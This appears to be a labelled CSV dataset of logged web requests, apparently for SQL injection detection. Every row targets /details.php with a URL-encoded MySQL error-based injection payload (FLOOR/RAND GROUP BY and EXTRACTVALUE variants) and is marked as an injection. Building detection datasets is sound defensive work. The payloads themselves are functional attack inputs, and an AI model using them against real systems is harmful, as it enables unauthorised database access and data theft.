full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%28%28%22KuJx%22%20LIKE%20%22KuJx,1681395136.724939,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%22LWki%22%20LIKE%20%22LWki,1681395136.72911,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20BSYa,1681395136.733453,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%23%20YFcW,1681395136.739298,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20OR%20%27ZxFY%27%3D%27yoiM,1681395136.745909,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20WHERE%204913%3D4913%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20qpaO,1681395136.750747,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20WHERE%205804%3D5804%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20KVVn,1681395136.755845,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20WHERE%203632%3D3632%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20PxXZ,1681395136.760798,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20WHERE%206143%3D6143%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20xLnG,1681395136.770227,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20WHERE%203489%3D3489%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20DXee,1681395136.774803,192.168.43.6,1
/details.php?prod=5&type=%3F%20WHERE%206425%3D6425%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20ADFd,1681395136.779751,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x47586272%20WHERE%206239%3D6239%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%7C%27,1681395136.784346,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6a784d79%20FROM%20DUAL%20WHERE%203825%3D3825%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%7C%27,1681395136.7893,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x6566444e%20WHERE%203963%3D3963%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%2B%27,1681395136.794313,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x73466969%20FROM%20DUAL%20WHERE%202053%3D2053%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%7C,1681395136.79987,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x48735a44%20WHERE%209481%3D9481%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%7C,1681395136.804652,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20ITrp%20WHERE%209438%3D9438%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%2B,1681395136.809715,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x57475846%20WHERE%202751%3D2751%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%2B,1681395136.814776,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20Bhky%20WHERE%204827%3D4827%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20tSmg,1681395136.81926,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20pcGJ%20WHERE%204753%3D4753%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20WPcV,1681395136.824238,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AS%20IWec%20WHERE%209802%3D9802%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20eBAN,1681395136.828882,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AS%20sUiO%20WHERE%201729%3D1729%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20LanW,1681395136.833675,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AS%20cQCT%20WHERE%202214%3D2214%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20RAGo,1681395136.838097,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AS%20uIfg%20WHERE%201881%3D1881%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20uMvw,1681395136.851307,192.168.43.6,1
/details.php?prod=5&type=%3F%60%20WHERE%203568%3D3568%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20kBgr,1681395136.863788,192.168.43.6,1
/details.php?prod=5&type=%3F%60%29%20WHERE%204836%3D4836%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20dVHC,1681395136.868923,192.168.43.6,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%60%3F%60%3D%60%3F,1681395136.874063,192.168.43.6,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%22%3F%22%3D%22%3F,1681395136.879291,192.168.43.6,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%201564%3D1564%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%29%7C%5B%3F,1681395136.884253,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20OR%20%28SELECT%206223%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x71717a6271%2C%28SELECT%20%28ELT%286223%3D6223%2C1%29%29%29%2C0x717a626271%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%23,1681395136.888502,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20WgVJ,1681395136.896933,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20wWha,1681395136.901469,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20aoNq,1681395136.90681,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20bOsz,1681395136.912021,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%285279%3D5279,1681395136.924635,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%284919%3D4919,1681395136.929777,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%284724%3D4724,1681395136.936847,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29,1681395136.942265,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%27CVwi%27%3D%27CVwi,1681395136.952059,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%27zXyn%27%3D%27zXyn,1681395136.95794,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%27yzJW%27%3D%27yzJW,1681395136.962458,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%27vAJt%27%3D%27vAJt,1681395136.967494,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%27KWdr%27%20LIKE%20%27KWdr,1681395136.972723,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%27CYqB%27%20LIKE%20%27CYqB,1681395137.011754,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%27mlFz%27%20LIKE%20%27mlFz,1681395137.01667,192.168.43.6,1
/details.php?prod=5&type=%3F%25%27%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%27gdfy%25%27%3D%27gdfy,1681395137.021518,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%27bOUJ%27%20LIKE%20%27bOUJ,1681395137.026376,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%22makV%22%3D%22makV,1681395137.086531,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%22gNFO%22%3D%22gNFO,1681395137.092129,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%22xEAM%22%3D%22xEAM,1681395137.096846,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%22hcBT%22%3D%22hcBT,1681395137.102796,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%22Juaz%22%20LIKE%20%22Juaz,1681395137.160924,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%22ZKgx%22%20LIKE%20%22ZKgx,1681395137.165449,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%28%28%28%22VMao%22%20LIKE%20%22VMao,1681395137.170283,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20AND%20%22yhDD%22%20LIKE%20%22yhDD,1681395137.175004,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20xdlU,1681395137.233864,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%23%20gfNv,1681395137.23885,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%20OR%20%27LhBG%27%3D%27BYuB,1681395137.244098,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20WHERE%205800%3D5800%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20KxlF,1681395137.24839,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20WHERE%203106%3D3106%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20nzJd,1681395137.253425,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20WHERE%208219%3D8219%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20TulX,1681395137.258156,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20WHERE%202652%3D2652%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20mhRm,1681395137.264193,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20WHERE%203968%3D3968%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20lBcB,1681395137.269272,192.168.43.6,1
/details.php?prod=5&type=%3F%20WHERE%204897%3D4897%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20aWyn,1681395137.273795,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x4549716b%20WHERE%204658%3D4658%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C%27,1681395137.278925,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x506e4956%20FROM%20DUAL%20WHERE%203556%3D3556%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C%27,1681395137.284307,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x49716676%20WHERE%208788%3D8788%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%2B%27,1681395137.289049,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x68554869%20FROM%20DUAL%20WHERE%205313%3D5313%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C,1681395137.294345,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x61576962%20WHERE%207538%3D7538%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%7C%7C,1681395137.298628,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20MkFb%20WHERE%208452%3D8452%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%2B,1681395137.303401,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x4f726869%20WHERE%203932%3D3932%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29%29%2B,1681395137.307605,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20ZxXr%20WHERE%204232%3D4232%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20bHeI,1681395137.312207,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20wmnW%20WHERE%202301%3D2301%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20yhHk,1681395137.316946,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AS%20GSYM%20WHERE%203196%3D3196%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20FuWR,1681395137.321074,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AS%20SlgB%20WHERE%203426%3D3426%20AND%20EXTRACTVALUE%289188%2CCONCAT%280x5c%2C0x71717a6271%2C%28SELECT%20%28ELT%289188%3D9188%2C1%29%29%29%2C0x717a626271%29%29--%20Fjmb,1681395137.326169,192.168.43.6,1
